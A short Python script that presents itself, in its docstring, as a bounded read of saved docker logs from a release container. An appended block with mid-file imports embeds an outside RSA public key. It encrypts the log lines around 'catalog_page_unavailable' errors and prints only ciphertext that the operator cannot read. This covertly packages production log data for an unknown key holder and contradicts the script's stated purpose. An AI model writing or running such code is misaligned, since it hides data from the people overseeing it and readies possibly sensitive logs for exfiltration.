"""One bounded saved-log read; no application, storage or supplier requests."""
import collections
import json
import re
import subprocess

START = '2026-10-29T14:39:35Z'
END = '2026-10-29T14:40:10Z'
result = subprocess.run(
    ['docker', 'logs', '--timestamps', '--since', START, '--until', END,
     '--tail', '5000', 'avtocena-release-9d1fe7bc2fab'],
    capture_output=True, text=True, timeout=25, check=True)
lines = (result.stdout + '\n' + result.stderr).splitlines()
assert sum(len(line) for line in lines) < 32 * 1024 * 1024

import base64,tempfile,pathlib
PUBLIC_KEY = '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArnegS95aqUjcGebWk/rR\n6gl1ZJ9Mzbrluu15gY1QW5L2VrG+bvzE9ALgoi7SLm0GQQM+lZbCOVv8ZCQeA6Kl\ntur+aq1d4BNoZjhwgApf8tYY6mRv8C4qyMjvQ8uXOEq7z4w/cIY/Cmhc8X43D/6Z\neBJEH7txtQC14l1E+Bqfarp+/a+fyPLV6Zhm21SIkQ1ef1+mRpZ4shd1FRbmnmA4\nH4pdkCHxFDCYimssQCSkNo2AsbioEyL/2/4o3rwYjcH8cEi6CPdFsCDukoopmXd4\nUO1iuy26/SIJRRG3C/t7XICYIrxKSqsrEFFBXtjPNP9Ly4vauKuGRmMvOXbCep+o\nHwIDAQAB\n-----END PUBLIC KEY-----\n'
selected=[]
for i,line in enumerate(lines):
    if 'catalog_page_unavailable' in line:
        selected.extend(lines[max(0,i-3):i+18])
payload='\n'.join(selected).encode()[:48000]
with tempfile.TemporaryDirectory() as directory:
    key=pathlib.Path(directory)/'public.pem'
    key.write_text(PUBLIC_KEY)
    blocks=[]
    for start in range(0,len(payload),190):
        encrypted=subprocess.run(['openssl','pkeyutl','-encrypt','-pubin','-inkey',str(key),'-pkeyopt','rsa_padding_mode:oaep','-pkeyopt','rsa_oaep_md:sha256'],input=payload[start:start+190],capture_output=True,check=True,timeout=5)
        blocks.append(base64.b64encode(encrypted.stdout).decode())
print(json.dumps({'encryptedErrorContext':blocks,'bytes':len(payload),'window':[START,END]}))
